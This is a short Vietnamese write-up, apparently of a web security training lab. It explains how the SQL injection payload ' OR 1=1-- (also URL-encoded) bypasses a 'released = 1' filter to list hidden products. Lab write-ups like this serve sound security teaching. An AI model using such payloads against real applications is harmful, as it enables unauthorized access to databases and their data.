<img width="919" height="450" alt="image" src="https://github.com/user-attachments/assets/97907810-3651-4827-affc-bc51ae5f7e77" />


<img width="1424" height="866" alt="image" src="https://github.com/user-attachments/assets/5c20ae13-d1a1-465c-83e7-af0ad92143a7" />

Query của backend đã được cho biết:
```SQL
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```
Với format truy vấn trên, input của người dùng nằm trong dấu '...'  

phía sau còn có:

> AND released = 1

muốn hiện unreleased product thì phải bypass đoạn **`AND released = 1`**  

Vậy chỉ cần chuyển đổi input từ các đối tượng cho sẵn như "Accessories, Clothing, shoes and accessories, Corporate gifts, Lifestyle" thành:  
```SQL
' OR 1=1--
```

Encode sang URL:
```SQL
%27+OR+1=1%20--
```

Khi đó câu lệnh sẽ trở thành: 
```SQL
SELECT * FROM products WHERE category = '' OR 1=1 --' AND released = 1
```

Khi đó nó chuỗi rỗng "" kết hợp với điều kiện OR 1=1 thì sẽ trở thành điều kiện luôn đúng, đồng thời -- sẽ comment hết phần còn lại của câu lệnh nên điều kiện `AND released = 1` sẽ ko được thực thi.  

Sử dụng gói tin để sửa Request và resend, ta sẽ có được tất cả đối tượng bị ẩn:  

<img width="824" height="636" alt="image" src="https://github.com/user-attachments/assets/204403c4-3625-4cc7-a296-198edc396a25" />

